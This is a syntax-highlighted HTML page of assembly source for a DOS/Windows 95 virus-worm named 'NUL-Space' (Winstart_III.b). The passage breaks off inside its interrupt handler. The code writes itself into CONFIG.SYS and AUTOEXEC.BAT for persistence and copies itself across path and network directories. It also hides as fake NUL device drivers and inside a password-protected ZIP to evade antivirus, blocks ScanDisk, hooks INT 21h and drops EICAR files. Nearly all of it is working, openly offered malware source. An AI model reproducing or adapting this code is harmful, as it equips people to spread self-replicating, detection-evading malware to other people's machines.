<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.BAT.Winstart_III.b - nulspace.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">

</span><span class="sc1">; Designed by "Q" the Misanthrope</span><span class="sc0">

</span><span class="sc1">; This virii/worm hides is NUL-Space and Cypher Text (See my "Playing Hide and</span><span class="sc0">
</span><span class="sc1">; Seek" article)  Once active this virus can not be detected by normal means.</span><span class="sc0">
</span><span class="sc1">; It hides in a file that has the same name as a NUL device driver.  It also</span><span class="sc0">
</span><span class="sc1">; hides in a ZIP file that is password protected so AV programs won't detect it.</span><span class="sc0">
</span><span class="sc1">; It has an unusual payload: it creates those stupid EICAR test files all over</span><span class="sc0">
</span><span class="sc1">; the PC.  It is network aware and only spreads by network drives.  It works</span><span class="sc0">
</span><span class="sc1">; with Windows 95.</span><span class="sc0">

</span><span class="sc1">; tasm nulspace /m2</span><span class="sc0">
</span><span class="sc1">; tlink nulspace /t</span><span class="sc0">
</span><span class="sc1">; copy nulspace.com c:\winstart.bat</span><span class="sc0">

</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc5">qseg</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">qseg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">qseg</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">qseg</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">00feh</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">com_install</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;batch file starting</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"::"</span><span class="sc0">                    </span><span class="sc1">;as a com file it jumps past</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">jmp_next_part</span><span class="sc0">           </span><span class="sc1">;the batch code</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">jmp_next_part</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"@CTTY NUL"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">     </span><span class="sc1">;output off and change config</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ECHO INSTALLHIGH=C:\WINSTART.BAT&gt;&gt;C:\CONFIG.SYS"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"IF %Q%==Q GOTO "</span><span class="sc0">       </span><span class="sc1">;used for reinfection</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">(</span><span class="sc5">go_mem_res</span><span class="sc4">-</span><span class="sc5">jmp_next_part3</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">(</span><span class="sc5">go_mem_res</span><span class="sc4">-</span><span class="sc5">jmp_next_part3</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":"</span><span class="sc0">
</span><span class="sc5">jmp_next_part</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jo</span><span class="sc0">      </span><span class="sc5">jmp_next_part1</span><span class="sc0">          </span><span class="sc1">;more stupid jumps</span><span class="sc0">
                </span><span class="sc6">jno</span><span class="sc0">     </span><span class="sc5">jmp_next_part1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PKZIP -3 -- -+ -~ -S"</span><span class="sc0">  </span><span class="sc1">;compress ourselves </span><span class="sc0">
</span><span class="sc5">password1</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">"XXX C:\"               ;use password
</span><span class="sc5">random_file1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"QUE."</span><span class="sc0">                  </span><span class="sc1">;random file name</span><span class="sc0">
</span><span class="sc5">random_ext1</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CAB C:\WINSTART.BAT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ECHO @ECHO OFF&gt;&gt;C:\AUTOEXEC.BAT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":"</span><span class="sc0">                     </span><span class="sc1">;prepare autoexec for reinfect</span><span class="sc0">
</span><span class="sc5">jmp_next_part1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">jmp_next_part2</span><span class="sc0">          </span><span class="sc1">;more jumps</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">jmp_next_part2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ECHO CTTY NUL&gt;&gt;C:\AUTOEXEC.BAT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ECHO PKUNZIP -) -3 -O -S"</span><span class="sc0">
</span><span class="sc5">password2</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">"XXX C:\"               ;reinfect again
</span><span class="sc5">random_file2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"QUE."</span><span class="sc0">
</span><span class="sc5">random_ext2</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CAB&gt;&gt;C:\AUTOEXEC.BAT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":"</span><span class="sc0">
</span><span class="sc5">jmp_next_part2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jpe</span><span class="sc0">     </span><span class="sc5">jmp_next_part3</span><span class="sc0">          </span><span class="sc1">;more jumps</span><span class="sc0">
                </span><span class="sc6">jpo</span><span class="sc0">     </span><span class="sc5">jmp_next_part3</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                 </span><span class="sc1">;set q=q for jmp in winstart</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ECHO SET Q=Q&gt;&gt;C:\AUTOEXEC.BAT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ECHO CTTY CON&gt;&gt;C:\AUTOEXEC.BAT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":"</span><span class="sc0">
</span><span class="sc5">jmp_next_part3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">go_mem_res</span><span class="sc0">              </span><span class="sc1">;more jumps</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">go_mem_res</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                 </span><span class="sc1">;spread it around</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FOR %%Q IN (%PATH% C:\) DO %COMSPEC% /F/CCOPY/B %0+%0.BAT %%Q"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CTTY CON"</span><span class="sc0">              </span><span class="sc1">;output on</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1ah</span><span class="sc0">                     </span><span class="sc1">;ctrl-z</span><span class="sc0">
</span><span class="sc5">com_install</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">go_mem_res</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;clear environment space</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;create NUL-Space devices</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">scandisk_device</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">                </span><span class="sc1">;3 of them, first is scandskw</span><span class="sc0">
</span><span class="sc5">next_device</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                  </span><span class="sc1">;get list of lists</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc1">;get NUL device chain</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;point to new device to add</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;put it in chain</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;far pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc1">;point to new device</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar_device</span><span class="sc4">-</span><span class="sc5">scandisk_device</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">next_device</span><span class="sc0">             </span><span class="sc1">;do eicar and winstart device</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;hook interrupt 21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">previous_hook</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">previous_hook</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2518h</span><span class="sc0">                </span><span class="sc1">;save old interrupt 21 as 18</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">resident_isr21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">                  </span><span class="sc1">;go memory resident</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,((</span><span class="sc5">tail</span><span class="sc4">-</span><span class="sc5">com_install</span><span class="sc4">+</span><span class="sc2">0110h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">go_mem_res</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">interrupt_24</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">;fiddly little critical error</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">;handler</span><span class="sc0">
</span><span class="sc5">return_far</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">;retf for NUL device routines</span><span class="sc0">
</span><span class="sc5">interrupt_24</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">vname</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" NUL-Space "</span><span class="sc0">
</span><span class="sc5">scandisk_device</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">;our 3 new NUL-Space devices</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8004h</span><span class="sc0">                   </span><span class="sc1">;nul character attributes</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">return_far</span><span class="sc0">              </span><span class="sc1">;do nothing routines</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">return_far</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SCANDSKW"</span><span class="sc0">              </span><span class="sc1">;stop scandskw in windows 95</span><span class="sc0">
</span><span class="sc5">eicar_device</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8004h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">return_far</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">return_far</span><span class="sc0">
</span><span class="sc5">eicar_dev_name</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"EICAR   "</span><span class="sc0">              </span><span class="sc1">;protect those stupid eicar</span><span class="sc0">
</span><span class="sc5">winstart_device</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">;files while we infect</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8004h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">return_far</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">return_far</span><span class="sc0">
</span><span class="sc5">win_dev_name</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WINSTART"</span><span class="sc0">              </span><span class="sc1">;finally protect ourselves</span><span class="sc0">
</span><span class="sc5">winstart_file</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\WINSTART.BAT"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">;file name to replicate</span><span class="sc0">
</span><span class="sc5">eicar_drive</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:"</span><span class="sc0">                    
</span><span class="sc5">eicar_file</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"EICAR."</span><span class="sc0">                
</span><span class="sc5">eicar_ext</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"QUE"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">drive_number</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">27</span><span class="sc0">

</span><span class="sc5">eicar</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;stupid EICAR file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">214Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4140h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5Ch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2834h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">terminate</span><span class="sc0">
</span><span class="sc5">eicar_text</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$'</span><span class="sc0">
</span><span class="sc5">terminate</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">eicar_length</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">eicar</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_random3</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">                </span><span class="sc1">;3 byte random file</span><span class="sc0">
</span><span class="sc5">setname</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;random name at ds:si &amp; ds:di</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">around</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">around</span><span class="sc0">                  </span><span class="sc1">;psuedo random delay</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                  </span><span class="sc1">;32 letters possible</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">nameit</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc0">                   </span><span class="sc1">;if above Z then make it 1-6</span><span class="sc0">
</span><span class="sc5">nameit</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;save random name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">incloop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;get the high byte</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">setname</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">create_random3</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">resident_isr21</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;only infect every 65536 times</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect_now</span><span class="sc0">              </span><span class="sc1">;into interrupt 21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">not_infect_now</span><span class="sc0">
</span><span class="sc5">infect_now</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                </span><span class="sc1">;set critical error handler</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
